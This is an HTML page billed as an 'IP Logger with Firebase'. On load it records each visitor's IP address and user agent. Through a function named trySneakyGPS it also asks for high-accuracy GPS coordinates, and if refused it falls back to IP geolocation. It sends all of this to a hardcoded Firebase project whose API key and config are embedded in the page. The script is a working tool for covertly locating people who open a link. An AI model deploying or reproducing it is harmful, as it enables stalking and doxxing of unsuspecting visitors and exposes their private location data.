<!DOCTYPE html>
<html>
<head>
  <title>IP Logger with Firebase (Always get visitor IP)</title>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
</head>
<body>
<h3>Logging your IP and location...</h3>
<script>
  const firebaseConfig = {
    apiKey: "AIzaSyBmeCiF-qqHkaM81Jq-whaxvz4zJ6Ni3R0",
    authDomain: "yachad-32fe3.firebaseapp.com",
    databaseURL: "https://yachad-32fe3-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "yachad-32fe3",
    storageBucket: "yachad-32fe3.firebasestorage.app",
    messagingSenderId: "720032034735",
    appId: "1:720032034735:web:cabedda1dc842420bbc95a",
    measurementId: "G-YH1NK3RHY3"
  };

  firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore();

  // Helpers for fetching IP and location APIs
  async function getVisitorIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip || "unknown";
    } catch {
      return "unknown";
    }
  }

  function fetchLocation(url, parser) {
    return fetch(url)
      .then(res => res.json())
      .then(parser)
      .catch(() => null);
  }

  function parseIpApi(data) {
    return {
      lat: data.lat || null,
      lon: data.lon || null
    };
  }

  function parseIpWhoIs(data) {
    if (data.success === false) return null;
    return {
      lat: data.latitude || null,
      lon: data.longitude || null
    };
  }

  function saveToFirestore(lat, lon, ip, source) {
    const ua = navigator.userAgent;
    const time = new Date().toISOString();
    db.collection('ipLogs').add({
      ip: ip,
      userAgent: ua,
      timestamp: time,
      latitude: lat,
      longitude: lon,
      source: source
    }).then(() => {
      document.body.innerHTML = `<p>Your location has been logged using <b>${source}</b>.</p>`;
    }).catch(err => {
      document.body.innerHTML = `<p>Error logging location: ${err}</p>`;
    });
  }

  function fallbackToIPLocation(visitorIP) {
    document.body.innerHTML = "<p>Fetching approximate location via IP...</p>";
    Promise.all([
      fetchLocation('https://ip-api.com/json/', parseIpApi),
      fetchLocation('https://ipwho.is/', parseIpWhoIs)
    ]).then(results => {
      const validResults = results.filter(r => r !== null);
      if (validResults.length === 0) {
        document.body.innerHTML = "<p>Failed to fetch location from all IP APIs.</p>";
        return;
      }
      let latSum = 0, lonSum = 0, count = 0;
      validResults.forEach(r => {
        if (r.lat !== null && r.lon !== null) {
          latSum += r.lat;
          lonSum += r.lon;
          count++;
        }
      });
      const avgLat = count ? latSum / count : null;
      const avgLon = count ? lonSum / count : null;
      saveToFirestore(avgLat, avgLon, visitorIP, "IP");
    }).catch(err => {
      document.body.innerHTML = `<p>Unexpected error fetching IP location: ${err}</p>`;
    });
  }

  async function trySneakyGPS(visitorIP) {
    if ("geolocation" in navigator) {
      document.body.innerHTML = "<p>Trying to get your precise location...</p>";
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          saveToFirestore(lat, lon, visitorIP, "GPS");
        },
        (error) => {
          document.body.innerHTML = "<p>Location access denied or unavailable, falling back to IP location.</p>";
          fallbackToIPLocation(visitorIP);
        },
        { timeout: 7000, maximumAge: 0, enableHighAccuracy: true }
      );
    } else {
      document.body.innerHTML = "<p>Geolocation not supported, falling back to IP location.</p>";
      fallbackToIPLocation(visitorIP);
    }
  }

  // Main entry: get IP first, then try GPS or fallback
  (async () => {
    const visitorIP = await getVisitorIP();
    trySneakyGPS(visitorIP);
  })();

</script>
</body>
</html>
